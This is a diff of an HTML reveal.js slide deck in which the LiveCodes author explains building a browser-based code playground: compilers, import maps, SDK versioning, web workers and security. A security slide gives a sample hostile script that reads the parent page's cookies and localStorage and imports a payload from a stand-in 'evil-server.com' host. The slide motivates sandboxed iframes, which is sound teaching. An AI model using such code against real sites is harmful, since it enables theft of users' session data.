@@ -1,402 +1,641 @@
 <!DOCTYPE html>
-<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>What I Learned Building a Code Playground</title><link rel="stylesheet" href="https://unpkg.com/reveal.js@4.6.1/dist/reveal.css"><link rel="stylesheet" href="https://unpkg.com/reveal.js@4.6.1/dist/theme/white.css"><link rel="stylesheet" href="https://unpkg.com/reveal.js@4.6.1/plugin/highlight/monokai.css"><link rel="stylesheet" href="./style.css"><script src="https://unpkg.com/es-module-shims@1.4.4/dist/es-module-shims.js" async=""></script><script type="importmap">{"imports": {
+<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>What I Learned Building A Code Playground</title><link rel="stylesheet" href="https://unpkg.com/reveal.js@4.6.1/dist/reveal.css"><link rel="stylesheet" href="https://unpkg.com/reveal.js@4.6.1/dist/theme/white.css"><link rel="stylesheet" href="https://unpkg.com/reveal.js@4.6.1/plugin/highlight/monokai.css"><link rel="stylesheet" href="./style.css"><script src="https://unpkg.com/es-module-shims@1.4.4/dist/es-module-shims.js" async=""></script><script type="importmap">{"imports": {
   "reveal.js@4.6.1": "https://jspm.dev/reveal.js@4.6.1",
   "reveal.js@4.6.1/plugin/markdown/markdown.esm.js": "https://jspm.dev/reveal.js@4.6.1/plugin/markdown/markdown.esm.js",
   "reveal.js-mermaid-plugin@2.0.0/plugin/mermaid/mermaid.esm.js": "https://jspm.dev/reveal.js-mermaid-plugin@2.0.0/plugin/mermaid/mermaid.esm.js",
   "reveal.js@4.6.1/plugin/highlight/highlight.esm.js": "https://jspm.dev/reveal.js@4.6.1/plugin/highlight/highlight.esm.js",
   "livecodes@0.2.0": "https://jspm.dev/livecodes@0.2.0",
-  "uuid": "https://jspm.dev/uuid"
+  "uuid": "https://jspm.dev/uuid",
+  "react": "https://jspm.dev/react",
+  "underscore": "https://jspm.dev/underscore"
 }}</script></head><body><div class="reveal">
   <div class="slides">
 
-    <section data-visibility="!hidden" class="home">
-      <img id="home-bg" src="https://hatemhosny.github.io/livecodes-assets/assets/169573984565342147902496/lessons-learned-bg.jpg">
-      <h2>What I Learned Building a Code Playground</h2>
+    <section data-visibility="!hidden" class="home" data-background-image="https://hatemhosny.github.io/livecodes-assets/assets/169573984565342147902496/lessons-learned-bg.jpg" data-background-opacity="0.1">
+      <h2>What I Learned Building A Code Playground</h2>
       <img id="think-learn" src="https://hatemhosny.github.io/livecodes-assets/assets/169573987598111608420099/lessons-learned.png">
       <div class="author">Hatem Hosny</div>
     </section>
 
-    <section data-visibility="!hidden" data-title="Agenda" class="align-left">
-      <h2>Agenda</h2>
-      <ul>
-        <li>Introduction</li>
-        <li>Challenges and Decisions
-          <ul>
-            <li>Web Platform</li>
-            <li>Client-Server Interface</li>
-            <li>Performance</li>
-            <li>Security</li>
-          </ul>
-        </li>
-        <li>Conclusions</li>
-      </ul>
-    </section>
+    <section data-visibility="!hidden" data-title="Overview">
+      <section data-visibility="!hidden" data-title="Agenda" class="align-left">
+        <h2>Agenda</h2>
+        <ul>
+          <li>Introduction</li>
+          <li>Challenges and Decisions
+            <ul>
+              <li>Web Platform</li>
+              <li>Client-Server Interface</li>
+              <li>Performance</li>
+              <li>Security</li>
+            </ul>
+          </li>
+          <li>Conclusions</li>
+        </ul>
+      </section>
 
-    <section data-visibility="!hidden" data-title="Disclosures">
-      <h2>Disclosures</h2>
-      <p class="fragment">I'm a doctor!</p>
-      <p class="fragment">... and the author of LiveCodes</p>
+      <section data-visibility="!hidden" data-title="Disclosures">
+        <h2>Disclosures</h2>
+        <div class="align-middle">
+          <p class="fragment">I'm a doctor!</p>
+          <p class="fragment">... and the author of LiveCodes</p>
+        </div>
+      </section>
     </section>
 
     <section data-visibility="!hidden" data-title="LiveCodes">
-      <h2>LiveCodes</h2>
-      <img height="200" src="https://livecodes.io/livecodes/assets/images/livecodes-logo.svg">
-      <p>A Code Playground That Just Works!</p>
-      <p>
-        <a href="https://livecodes.io" target="_blank">https://livecodes.io</a>
-      </p>
-    </section>
+      <section data-visibility="!hidden" data-title="LiveCodes: intro">
+        <h2>LiveCodes</h2>
+        <img height="200" src="https://livecodes.io/livecodes/assets/images/livecodes-logo.svg">
+        <p>A Code Playground That Just Works!</p>
+        <p>
+          <a href="https://livecodes.io" target="_blank">https://livecodes.io</a>
+        </p>
+      </section>
 
-    <section data-visibility="!hidden" data-title="LiveCodes screenshot">
-      <img src="https://livecodes.io/docs/img/screenshots/react-template.png">
-    </section>
+      <section data-visibility="!hidden" data-title="LiveCodes: screenshot">
+        <img src="https://livecodes.io/docs/img/screenshots/react-template.png">
+      </section>
 
-    <section data-visibility="!hidden" data-title="Language Support">
-      <h2>Language Support</h2>
-      <img src="https://hatemhosny.github.io/livecodes-assets/assets/169573989309196876853454/languages.png">
-    </section>
+      <section data-visibility="!hidden" data-title="LiveCodes: Language Support">
+        <h2>Language Support</h2>
+        <img src="https://hatemhosny.github.io/livecodes-assets/assets/169573989309196876853454/languages.png">
+      </section>
 
-    <section data-visibility="!hidden" data-title="Features">
-      <h2>Features</h2>
-      <img src="https://hatemhosny.github.io/livecodes-assets/assets/169573989962828990321891/features.png">
-    </section>
+      <section data-visibility="!hidden" data-title="LiveCodes: Features">
+        <h2>Features</h2>
+        <img src="https://hatemhosny.github.io/livecodes-assets/assets/169573989962828990321891/features.png">
+      </section>
 
-    <section data-visibility="!hidden" data-title="Embedded Playgrounds" class="align-left">
-      <h2>Embedded Playgrounds</h2>
-      <ul>
-        <li>Can be embedded in any web page</li>
-        <li>Powerful SDK
-          <ul>
-            <li>JavaScript/TypeScript</li>
-            <li>React</li>
-            <li>Vue</li>
-            <li>Svelte</li>
-          </ul>
-        </li>
-        <li>Communicate with embedded playgrounds</li>
-      </ul>
-    </section>
+      <section data-visibility="!hidden" data-title="LiveCodes: Embedded Playgrounds" class="align-left">
+        <h2>Embedded Playgrounds</h2>
+        <ul>
+          <li>Can be embedded in any web page</li>
+          <li>Powerful SDK
+            <ul>
+              <li>JavaScript/TypeScript</li>
+              <li>React</li>
+              <li>Vue</li>
+              <li>Svelte</li>
+            </ul>
+          </li>
+          <li>Communicate with embedded playgrounds</li>
+        </ul>
+      </section>
 
-    <section data-visibility="!hidden" data-title="Client-Side" class="align-left">
-      <h2>Client-Side!</h2>
-      <ul>
-        <li>Yes, all compilers run in the browser!</li>
-        <li>No server rounds</li>
-        <li>No servers to configure (or pay for!)</li>
-        <li>All projects are private by default</li>
-        <li>Free with unlimited usage</li>
-        <li>Can be self-hosted on any static file server</li>
-      </ul>
-    </section>
+      <section data-visibility="!hidden" data-title="LiveCodes: [LiveCodes] React">
+          <h2>Demo</h2>
+          <div id="react-demo" class="livecodes" data-height="70vh"></div>
+      </section>
 
-    <section data-visibility="!hidden" data-title="Free and Open-Source" class="align-left">
-      <h2>Free and Open-Source</h2>
-      <ul>
-        <li>MIT License</li>
-        <li>No limits for use</li>
-        <li>No ads</li>
-        <li>No accounts required</li>
-      </ul>
-      <p>&nbsp;</p>
-      <p><a href="https://github.com/live-codes/livecodes" target="_blank">https://github.com/live-codes/livecodes</a></p>
+      <section data-visibility="!hidden" data-title="LiveCodes: Client-Side" class="align-left">
+        <h2>Client-Side!</h2>
+        <ul>
+          <li>Yes, all compilers run in the browser!</li>
+          <li>No server rounds</li>
+          <li>No servers to configure (or pay for!)</li>
+          <li>All projects are private by default</li>
+          <li>Free with unlimited usage</li>
+          <li>Can be self-hosted on any static file server</li>
+        </ul>
+      </section>
+
+      <section data-visibility="!hidden" data-title="LiveCodes: Free and Open-Source" class="align-left">
+        <h2>Free and Open-Source</h2>
+        <ul>
+          <li>MIT License</li>
+          <li>No limits for use</li>
+          <li>No ads</li>
+          <li>No accounts required</li>
+        </ul>
+        <p>&nbsp;</p>
+        <p><a href="https://github.com/live-codes/livecodes" target="_blank">https://github.com/live-codes/livecodes</a></p>
+      </section>
     </section>
 
     <section data-visibility="!hidden" data-title="Challenges">
-      <h2>Challenges</h2>
+      <h2 class="title">Challenges</h2>
     </section>
 
-    <section data-visibility="!hidden" data-title="Challenge: Run 80+ Languages">
-      <h2>Run 80+ Languages</h2>
-    </section>
+    <section data-visibility="!hidden" data-title="Challenge: Running 80+ Languages">
+      <section data-visibility="!hidden" data-title="Languages: Running 80+ Languages" class="align-left">
+        <h2 class="title">Running 80+ Languages</h2>
+      </section>
 
-    <section data-visibility="!hidden" data-title="Languages: Run 80+ Languages" class="align-left">
-      <h2>Run 80+ Languages</h2>
-      <ul>
-        <li>Options:
-          <ul>
-            <li class="fragment">Servers</li>
-            <li class="fragment">Web Containers</li>
-            <li class="fragment">Use the platform!
-              <ul>
-                <li class="fragment">JavaScript</li>
-                <li class="fragment">WebAssembly (Wasm)</li>
-              </ul>
-            </li>
-          </ul>
-        </li>
-      </ul>
-    </section>
+      <section data-visibility="!hidden" data-title="Languages: Running 80+ Languages" class="align-left">
+        <h2>Running 80+ Languages</h2>
+        <ul>
+          <li data-fragment-index="0">Options:
+            <ul>
+              <li class="fragment" data-fragment-index="1">Servers</li>
+              <li class="fragment" data-fragment-index="2">WebContainers</li>
+              <li class="fragment">Use the platform!
+                <ul>
+                  <li class="fragment">JavaScript</li>
+                  <li class="fragment">WebAssembly (Wasm)</li>
+                </ul>
+              </li>
+            </ul>
+          </li>
+        </ul>
+        <img class="fragment fade-in-then-out" data-fragment-index="3" src="https://blog.livecodes.io/assets/images/node_modules-e1485013c951e9c87d85fde6f5fac045.jpg" alt="node_modules" style="margin-top: -10%; width: 50%; float: right;">
+      </section>
 
-    <section data-visibility="!hidden" data-title="Languages: [Diagram] Languages">
-      <h2>Languages</h2>
-      <div class="mermaid fragment">
-        <pre>          graph LR
-              A[/Language A\n`compiles to JS`/]
-              B{{Language B\n`JS runtime`}}
-              C&gt;Language C\n`Wasm runtime`]
-        </pre>
-      </div>
-    </section>
+      <section data-visibility="!hidden" data-title="Languages: [Diagram] Languages">
+        <h2>Languages</h2>
+        <div class="mermaid fragment">
+          <pre>            graph LR
+                A[/Language A\n`compiles to JS`/]
+                B{{Language B\n`JS runtime`}}
+                C&gt;Language C\n`Wasm runtime`]
+          </pre>
+        </div>
+      </section>
 
-    <section data-visibility="!hidden" data-title="Languages: [Diagram] Create Compilers">
-      <h2>Create Compilers</h2>
-      <div class="mermaid fragment">
-        <pre>          graph LR
-              comp[Create Compiler] -- Config --&gt; A[/Language A\n`compiles to JS`/]
-              comp -- Config --&gt; B{{Language B\n`JS runtime`}}
-              comp -- Config --&gt; C&gt;Language C\n`Wasm runtime`]
-              A -- "⌛" --&gt; fnA(fn A)
-              fnA -- code --&gt; Script
-              B -- "⌛" --&gt; fnB(fn B)
-              fnB -- code --&gt; Script
-              C -- "⌛" --&gt; fnC(fn C)
-              fnC -- code --&gt; Script
-        </pre>
-      </div>
-    </section>
+      <section data-visibility="!hidden" data-title="Languages: [Diagram] Create Compilers">
+        <h2>Create Compilers</h2>
+        <div class="mermaid fragment">
+          <pre>            graph LR
+                comp[Create Compiler] -- Config --&gt; A[/Language A\n`compiles to JS`/]
+                comp -- Config --&gt; B{{Language B\n`JS runtime`}}
+                comp -- Config --&gt; C&gt;Language C\n`Wasm runtime`]
+                A -- "⌛" --&gt; fnA(fn A)
+                fnA -- code --&gt; Script
+                B -- "⌛" --&gt; fnB(fn B)
+                fnB -- code --&gt; Script
+                C -- "⌛" --&gt; fnC(fn C)
+                fnC -- code --&gt; Script
+          </pre>
+        </div>
+      </section>
 
-    <section data-visibility="!hidden" data-title="Languages: [Code] Compiler" data-markdown="">
-      <textarea data-template="">        ## Compiler
-        ```ts [1|2|8-11|3-5]
-        export interface Compiler {
-          factory: (config: Config) =&gt; CompilerFunction;
-          url?: string;
-          scripts?: string[],
-          // ...
-        }
+      <section data-visibility="!hidden" data-title="Languages: [Code] Compiler" data-markdown="">
+        <textarea data-template="">          ## Compiler
+          ```ts [1|2|8-11|3-5]
+          export interface Compiler {
+            factory: (config: Config) =&gt; CompilerFunction;
+            url?: string;
+            scripts?: string[],
+            // ...
+          }
 
-        export type CompilerFunction = (code: string) =&gt; Promise&lt;string&gt;;
-        ```
-      </textarea>
-    </section>
+          export type CompilerFunction = (code: string) =&gt; Promise&lt;string&gt;;
+          ```
+        </textarea>
+      </section>
 
-    <section data-visibility="!hidden" data-title="Languages: [Code] TS lang specs" data-markdown="">
-      <textarea data-template="">        ## Example
-        ```ts [1-5|6-8|9-12]
-        export const languageA: LanguageSpecs = {
-          name: 'language A',
-          compiler: {
-            factory:
-              async (config) =&gt; {
-                // lazy-load large file
-                const langA = await import('./lang-a-compiler.js');
-                const compiler = langA.compiler(config);
-                return async (code) =&gt; {
-                  const js = await compiler.compileToJs(code);
-                  return js;
+      <section data-visibility="!hidden" data-title="Languages: [Code] TS lang specs" data-markdown="">
+        <textarea data-template="">          ## Example
+          ```ts [1-5|6-8|9-12]
+          export const languageA: LanguageSpecs = {
+            name: 'language A',
+            compiler: {
+              factory:
+                async (config) =&gt; {
+                  // lazy-load large file
+                  const langA = await import('./lang-a-compiler.js');
+                  const compiler = langA.compiler(config);
+                  return async (code) =&gt; {
+                    const js = await compiler.compileToJs(code);
+                    return js;
+                  }
                 }
-              }
-          },
-          // ...
-        };
-        ```
-      </textarea>
-    </section>
+            },
+            // ...
+          };
+          ```
+        </textarea>
+      </section>
 
-    <section data-visibility="!hidden" data-title="Languages: [Code] TS lang specs" data-markdown="">
-      <textarea data-template="">        ## Example
-        ```ts [1-5|6-12]
-        export const languageC: LanguageSpecs = {
-          name: 'language C',
-          compiler: {
-            factory:
-              async (config) =&gt; {
-                return async (code) =&gt; {
-                  const script = `
-                  const mod = await import('./wasm-runtime.js');
-                  mod.runInWasm(${code}, ${JSON.stringify(config)});
-                  `
-                  return script;
+      <section data-visibility="!hidden" data-title="Languages: [Code] TS lang specs" data-markdown="">
+        <textarea data-template="">          ## Example
+          ```ts [1-5|6-12]
+          export const languageC: LanguageSpecs = {
+            name: 'language C',
+            compiler: {
+              factory:
+                async (config) =&gt; {
+                  return async (code) =&gt; {
+                    const script = `
+                    const mod = await import('./wasm-runtime.js');
+                    mod.runInWasm(${code}, ${JSON.stringify(config)});
+                    `
+                    return script;
+                  }
                 }
-              }
-          },
-          // ...
-        };
-        ```
-      </textarea>
-    </section>
+            },
+            // ...
+          };
+          ```
+        </textarea>
+      </section>
 
-    <section data-visibility="!hidden" data-title="Languages: [LiveCodes]">
-        <h2>Demo: Python (Pyodide)</h2>
-        <div id="pyodide-demo" class="livecodes" data-height="70vh"></div>
+      <section data-visibility="!hidden" data-title="Languages: [LiveCodes] Pyodide">
+          <h2>Demo: Python (Pyodide)</h2>
+          <div id="pyodide-demo" class="livecodes" data-height="70vh"></div>
+      </section>
     </section>
 
     <section data-visibility="!hidden" data-title="Challenge: Importing npm Modules">
-      <h2>Importing npm Modules</h2>
-    </section>
+      <section data-visibility="!hidden" data-title="Challenge: Importing npm Modules">
+        <h2 class="title">Importing npm Modules</h2>
+      </section>
 
-    <section data-visibility="!hidden" data-title="Importing npm Modules: [LiveCodes]">
-        <h2>Importing <span style="text-transform: lowercase">npm<span> Modules</span></span></h2>
-        <div id="modules-demo" class="livecodes" data-height="70vh"></div>
-    </section>
+      <section data-visibility="!hidden" data-title="Importing npm Modules: [LiveCodes]">
+          <h2>Importing npm Modules</h2>
+          <div id="modules-demo" class="livecodes" data-height="70vh"></div>
+      </section>
 
-    <section data-visibility="!hidden" data-title="Importing npm Modules: error" class="align-left">
-        <h2>Importing <span style="text-transform: lowercase">npm<span> Modules</span></span></h2>
-        <p><code>import {v4} from "uuid"</code></p>
-        <div class="fragment error">Uncaught TypeError: Failed to resolve module specifier "uuid". Relative references must start with either "/", "./", or "../".</div>
-    </section>
+      <section data-visibility="!hidden" data-title="Importing npm Modules: error" class="align-left">
+          <h2>Importing npm Modules</h2>
+          <p><code>import {v4} from "uuid"</code></p>
+          <div class="fragment error">Uncaught TypeError: Failed to resolve module specifier "uuid". Relative references must start with either "/", "./", or "../".</div>
+      </section>
 
-    <section data-visibility="!hidden" data-title="Importing npm Modules: URL" class="align-left">
-        <h2>Importing <span style="text-transform: lowercase">npm<span> Modules</span></span></h2>
-        <p><code>import {v4} from "https://jspm.dev/uuid"</code></p>
-        <div class="error" style="visibility: hidden">Uncaught TypeError: Failed to resolve module specifier "uuid". Relative references must start with either "/", "./", or "../".</div>
-    </section>
+      <section data-visibility="!hidden" data-title="Importing npm Modules: URL" class="align-left">
+          <h2>Importing npm Modules</h2>
+          <p><code>import {v4} from "https://jspm.dev/uuid"</code></p>
+      </section>
 
-    <section data-visibility="!hidden" data-title="Importing npm Modules: [Code] Import Maps" data-markdown="">
-      <textarea data-template="">        ## Import Maps
-        ```html [1,7|2-6|9-12]
-        &lt;script type="importmap"&gt;
-        {
-          "imports": {
-            "uuid": "https://jspm.dev/uuid"
+      <section data-visibility="!hidden" data-title="Importing npm Modules: Import Maps" data-markdown="">
+        <textarea data-template="">          ## Import Maps
+        </textarea>
+      </section>
+
+      <section data-visibility="!hidden" data-title="Importing npm Modules: [Code] Import Maps" data-markdown="">
+        <textarea data-template="">          ## Import Maps
+          ```html [1,7|2-6|9-12]
+          &lt;script type="importmap"&gt;
+          {
+            "imports": {
+              "uuid": "https://jspm.dev/uuid"
+            }
           }
-        }
-        &lt;/script&gt;
+          &lt;/script&gt;
 
-        &lt;script type="module"&gt;
-          import { v4 } from "uuid";
-          document.body.innerHTML += v4();
-        &lt;/script&gt;
-        ```
-      </textarea>
+          &lt;script type="module"&gt;
+            import { v4 } from "uuid";
+            document.body.innerHTML += v4();
+          &lt;/script&gt;
+          ```
+        </textarea>
+      </section>
+
+      <section data-visibility="!hidden" data-title="Importing npm Modules: [Code] Import Maps" data-markdown="">
+        <textarea data-template="">          ## Import Maps
+          ```html [4,11|5,13-14]
+          &lt;script type="importmap"&gt;
+          {
+            "imports": {
+              "react": "https://jspm.dev/preact",
+              "underscore": "https://jspm.dev/lodash"
+            }
+          }
+          &lt;/script&gt;
+
+          &lt;script type="module"&gt;
+            import React from "react";
+            
+            const { default: _ } = await import("underscore");
+            console.log(_.random(1, 10)); // 7
+          &lt;/script&gt;
+          ```
+        </textarea>
+      </section>
+
+      <section data-visibility="!hidden" data-title="Importing npm Modules: [Code] Regex" data-markdown="">
+        <textarea data-template="">          ## Getting Imports
+          ```ts []
+          const importsPattern =
+            /(import\s+?(?:(?:(?:[\w*\s{},\$]*)\s+from\s+?)|))((?:".*?")|(?:'.*?'))([\s]*?(?:;|$|))/g;
+
+          const dynamicImportsPattern = /(import\s*?\(\s*?((?:".*?")|(?:'.*?'))\s*?\))/g;
+          ```
+        </textarea>
+      </section>
+
+      <section data-visibility="!hidden" data-title="Importing npm Modules: [Image] Regex" data-markdown="">
+        <textarea data-template="">          ## Getting Imports
+          ```ts []
+          const importsPattern =
+            /(import\s+?(?:(?:(?:[\w*\s{},\$]*)\s+from\s+?)|))((?:".*?")|(?:'.*?'))([\s]*?(?:;|$|))/g;
+
+          const dynamicImportsPattern = /(import\s*?\(\s*?((?:".*?")|(?:'.*?'))\s*?\))/g;
+          ```
+          ![regex problem](https://hatemhosny.github.io/livecodes-assets/assets/169584838629216468023216/regex-meme.jpg)
+        </textarea>
+      </section>
     </section>
 
-    <section data-visibility="!hidden" data-title="Importing npm Modules: [Code] Regex" data-markdown="">
-      <textarea data-template="">        ## Getting Imports
-        ```ts []
-        const importsPattern =
-          /(import\s+?(?:(?:(?:[\w*\s{},\$]*)\s+from\s+?)|))((?:".*?")|(?:'.*?'))([\s]*?(?:;|$|))/g;
+    <section data-visibility="!hidden" data-title="Challenge: Avoid Breaking Changes">
+      <section data-visibility="!hidden" data-title="Challenge: Avoid Breaking Changes">
+        <h2 class="title">Avoid Breaking Changes</h2>
+      </section>
 
-        const dynamicImportsPattern = /(import\s*?\(\s*?((?:".*?")|(?:'.*?'))\s*?\))/g;
-        ```
-      </textarea>
-    </section>
+      <section data-visibility="!hidden" data-title="SDK" class="align-left">
+        <h2>SDK</h2>
+        <ul>
+          <li class="fragment">for embedding playgrounds</li>
+          <li class="fragment">light-weight npm package (SDK)</li>
+          <li class="fragment">creates an Iframe</li>
+          <li class="fragment">loads LiveCodes with embed options (App)</li>
+          <li class="fragment">allows communication with the app</li>
+        </ul>
+      </section>
 
-    <section data-visibility="!hidden" data-title="Importing npm Modules: [Image] Regex">
-      <img src="https://hatemhosny.github.io/livecodes-assets/assets/169584838629216468023216/regex-meme.jpg" style="height: 70vh">
-    </section>
+      <section data-visibility="!hidden" data-title="SDK: [LiveCodes] Demo" data-background-iframe="https://hatemhosny.github.io/interactive-coding-tutorial/" data-background-interactive="true">
+      </section>
 
-    <section data-visibility="!hidden" data-title="Challenge: App vs. SDK Versions">
-      <h2>App vs. SDK Versions</h2>
-    </section>
+      <section data-visibility="!hidden" data-title="SDK: [Code]" data-markdown="">
+        <textarea data-template="">          ## SDK
+          ```html []
+          &lt;div id="container"&gt;&lt;/div&gt;
 
-    <section data-visibility="!hidden" data-title="SDK: Demo">
-      <h2>SDK</h2>
-      <iframe src="https://hatemhosny.github.io/interactive-coding-tutorial/" class="demo-iframe"></iframe>
-    </section>
+          &lt;script type="module"&gt;
+          import { createPlayground } from 'https://unpkg.com/livecodes';
 
-    <section data-visibility="!hidden" data-title="SDK: [Code]" data-markdown="">
-      <textarea data-template="">        ## SDK
-        ```html []
-        &lt;div id="container"&gt;&lt;/div&gt;
+          createPlayground('#container', {
+            params: {
+              markdown: '# Hello LiveCodes!',
+              css: 'h1 {color: dodgerblue;}',
+              js: 'console.log("Hello, from JS!");',
+              console: 'open',
+            },
+          });
+          &lt;/script&gt;
+          ```
+        </textarea>
+      </section>
 
-        &lt;script type="module"&gt;
-        import { createPlayground } from 'https://unpkg.com/livecodes';
+      <section data-visibility="!hidden" data-title="SDK: [Code] Permanent URL" data-markdown="">
+        <textarea data-template="">          ## Permanent URL
+          ```html [4,7]
+          &lt;div id="container"&gt;&lt;/div&gt;
 
-        createPlayground('#container', {
-          params: {
-            markdown: '# Hello LiveCodes!',
-            css: 'h1 {color: dodgerblue;}',
-            js: 'console.log("Hello, from JS!");',
-            console: 'open',
-          },
-        });
-        &lt;/script&gt;
-        ```
-      </textarea>
-    </section>
+          &lt;script type="module"&gt;
+          import { createPlayground } from 'https://unpkg.com/livecodes@0.2.0';
 
-    <section data-visibility="!hidden" data-title="SDK: [Code] Permanent URL" data-markdown="">
-      <textarea data-template="">        ## Permanent URL
-        ```html [4,7]
-        &lt;div id="container"&gt;&lt;/div&gt;
+          createPlayground('#container', {
+            appUrl: 'https://v14.livecodes.io',
+            params: {
+              markdown: '# Hello LiveCodes!',
+              css: 'h1 {color: dodgerblue;}',
+              js: 'console.log("Hello, from JS!");',
+              console: 'open',
+            },
+          });
+          &lt;/script&gt;
+          ```
+        </textarea>
+      </section>
 
-        &lt;script type="module"&gt;
-        import { createPlayground } from 'https://unpkg.com/livecodes@0.2.0';
-
-        createPlayground('#container', {
-          appUrl: 'https://v14.livecodes.io',
-          params: {
-            markdown: '# Hello LiveCodes!',
-            css: 'h1 {color: dodgerblue;}',
-            js: 'console.log("Hello, from JS!");',
-            console: 'open',
-          },
-        });
-        &lt;/script&gt;
-        ```
-      </textarea>
-    </section>
-
-    <section data-visibility="!hidden" data-title="SDK: [Diagram] Automated Releases">
-      <h2>Automated Releases</h2>
-      <div class="mermaid fragment">
-        <pre>          graph LR
-              release[Release] --&gt; SDK
-              SDK -- GH Actions --&gt; npm
-              npm --&gt; sdkV["livecodes@0.2.0"]
-              sdkV --&gt; CDNs
-              SDK -- commits --&gt; notes[CHANGE LOG]
-              release --&gt; App
-              App -- commits --&gt; notes
-              notes --&gt; ghRelease[GitHub Release]
-              App -- GH Actions --&gt; PR[PR -&gt; main]
-              PR -- CF Pages --&gt; Preview
-              Preview -- DNS API --&gt; Subdomain[v14.livecodes.io]
-              PR -- merge --&gt; Deploy
-              Deploy --&gt; Domain[livecodes.io]
-        </pre>
-      </div>
+      <section data-visibility="!hidden" data-title="SDK: [Diagram] Automated Releases">
+        <h2>Automated Releases</h2>
+        <div class="mermaid fragment">
+          <pre>            graph LR
+                release[Release] --&gt; SDK
+                SDK -- GH Actions --&gt; npm
+                npm --&gt; sdkV["livecodes@0.2.0"]
+                sdkV --&gt; CDNs
+                SDK -- commits --&gt; notes[CHANGE LOG]
+                release --&gt; App
+                App -- commits --&gt; notes
+                notes --&gt; ghRelease[GitHub Release]
+                App -- GH Actions --&gt; PR[PR -&gt; main]
+                PR -- CF Pages --&gt; Preview
+                Preview -- DNS API --&gt; Subdomain[v14.livecodes.io]
+                PR -- merge --&gt; Deploy
+                Deploy --&gt; Domain[livecodes.io]
+          </pre>
+        </div>
+      </section>
     </section>
 
     <section data-visibility="!hidden" data-title="Challenge: Compiler Performance">
-      <h2>Compiler Performance</h2>
+      <section data-visibility="!hidden" data-title="Challenge: Compiler Performance">
+        <h2 class="title">Compiler Performance</h2>
+      </section>
+
+      <section data-visibility="!hidden" data-title="Compiler Performance" class="align-left">
+        <h2>Compiler Performance</h2>
+        <ul>
+          <li class="fragment">Caching</li>
+          <li class="fragment">Web workers</li>
+        </ul>
+      </section>
+
+      <section data-visibility="!hidden" data-title="Compiler Performance: Caching">
+        <h2>Caching</h2>
+        <img class="fragment" src="https://livecodes.io/docs/img/screenshots/react-template.png">
+      </section>
+
+      <section data-visibility="!hidden" data-title="Compiler Performance: [Code] Caching" data-markdown="">
+        <textarea data-template="">          ## Caching
+          ```js [1-3|5,14|6-8|10-11|13|1-14]
+          // compiler.js
+          const cache = {}; 
+          // { markdown: { code: "# hi", compiled: "&lt;h1&gt;hi&lt;/h1&gt;" }}
+
+          const compile = async (code, {language}) =&gt; {
+            if (cache[language]?.code === code) {
+              return cache[language].compiled;
+            }
+
+            const compiled = await compileInWorker(code, {language});
+            cache[language] = { code, compiled };
+
+            return compiled;
+          };
+          ```
+        </textarea>
+      </section>
+
+      <section data-visibility="!hidden" data-title="Compiler Performance: Web Workers">
+        <h2>Web Workers</h2>
+        <img class="fragment" style="max-height: 80vh" src="https://uploads-ssl.webflow.com/5d2dd7e1b4a76d8b803ac1aa/61c2cb132a8a4407169084f9_IlgdwjqfRdCM_X4eTtn83Io545bgiR3zinZ99vgaHg-Y0fS8wO7G4ksf9PuObY-J1rknA6_Xt7w6nf3q153I7PvKc1w1c-DETSO_z_Di4fY5iDOOipCGSrznmeSag04VqWXV6UuC.png">
+      </section>
+
+      <section data-visibility="!hidden" data-title="Compiler Performance: [Code] Web Workers" data-markdown="">
+        <textarea data-template="">          ## Web Workers
+          ```js [1-2|4-7|9-11|1-11]
+          // main.js
+          const myWorker = new Worker("./compile-worker.js");
+
+          myWorker.postMessage({
+            language: "markdown",
+            code: "# Hello World!"
+          });
+
+          myWorker.onmessage = (event) =&gt; {
+            const compiled = event.data;
+          };
+          ```
+          ```js [1|1-3,7|4-5|6|1-7]
+          // compile-worker.js
+          self.onmessage = async (event) =&gt; {
+            const { language, code } = event.data;
+            const compilerFn = await loadCompilerFn({language});
+            const compiled = await compilerFn(code);
+            self.postMessage(compiled);
+          };
+          ```
+        </textarea>
+      </section>
+
+      <section data-visibility="!hidden" data-title="Compiler Performance: Web Workers" class="align-left">
+        <h2>Web Workers</h2>
+        <ul>
+          <li class="fragment"><code class="inline">self</code> instead of <code class="inline">window</code></li>
+          <li class="fragment">No access to DOM</li>
+          <li class="fragment">Message data must be serializable
+            <div class="fragment">(No functions or methods)</div>
+          </li>
+          <li class="fragment">Worker script must be from same origin</li>
+          <li class="fragment">But, you can <code class="inline">importScripts()</code> from anywhere!
+          <pre class="fragment javascript"><code data-line-numbers="">// worker.js
+importScripts("https://unpkg.com/lib/script.js");</code></pre>
+          </li>
+          <li class="fragment">Data URLs are <a href="https://livecodes.io/?x=id/3fkupkw8dmd&amp;console=open" target="_blank">allowed</a> ;)</li>
+        </ul>
+      </section>
+
     </section>
 
     <section data-visibility="!hidden" data-title="Challenge: Security">
-      <h2>Security</h2>
+      <section data-visibility="!hidden" data-title="Challenge: Security">
+        <h2 class="title">Security</h2>
+      </section>
+
+      <section data-visibility="!hidden" data-title="Security: Result Page">
+        <h2>Result Page</h2>
+      </section>
+
+      <section data-visibility="!hidden" data-title="Security: [Code] Result Page" data-markdown="">
+        <textarea data-template="">          ## Result Page
+          ```js [1|3|5|7-9]
+          parent.document.body.innerHTML = 'HACKED!';
+
+          const cookies = top.document.cookie;
+
+          const data = Object.entries(top.localStorage);
+
+          import('https://evil-server.com/malacious.js').then((mod) =&gt; {
+            mod.doSomethingBad();
+          })
+          ```
+        </textarea>
+      </section>
+
+      <section data-visibility="!hidden" data-title="Security: Sandboxed Iframes">
+        <h2>Sandboxed Iframes</h2>
+      </section>
+
+      <section data-visibility="!hidden" data-title="Security: [Code] Sandboxed Iframes" data-markdown="">
+        <textarea data-template="">          ## Sandboxed Iframes
+          ```html[]
+          &lt;iframe
+            sandbox="allow-scripts allow-popups allow-forms allow-same-origin"
+            src="https://unique-origin.com/untrusted.html" 
+          &gt;&lt;/iframe&gt;
+          ```
+          &lt;div class="fragment small align-left indent"&gt;
+            &lt;p&gt;&lt;code class="inline"&gt;allow-forms&lt;/code&gt;&lt;/p&gt;
+            &lt;p&gt;&lt;code class="inline"&gt;allow-popups&lt;/code&gt;&lt;/p&gt;
+            &lt;p&gt;&lt;code class="inline"&gt;allow-same-origin&lt;/code&gt;&lt;/p&gt;
+            &lt;p&gt;&lt;code class="inline"&gt;allow-scripts&lt;/code&gt;&lt;/p&gt;
+            &lt;p&gt;&lt;code class="inline"&gt;allow-top-navigation&lt;/code&gt;&lt;/p&gt;
